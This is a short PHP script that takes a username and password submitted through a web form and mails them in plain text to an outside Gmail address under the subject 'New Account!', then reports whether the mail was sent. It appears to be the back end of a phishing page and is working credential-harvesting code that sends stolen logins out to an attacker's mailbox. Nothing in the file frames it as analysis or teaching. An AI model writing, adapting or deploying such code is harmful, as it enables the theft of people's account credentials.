<html>
<body>
<?php
$to = "abserate55@gmail.com";
$subject = "New Account!";

$username = $_POST["username"];
$password = $_POST["password"];

$message = $username . ' ' . $password;


$result = mail($to, $subject, $message);

if ($result == true){
    echo "SENT";
} else {
    echo "NOT SENT";
}

?>

</body>
</html>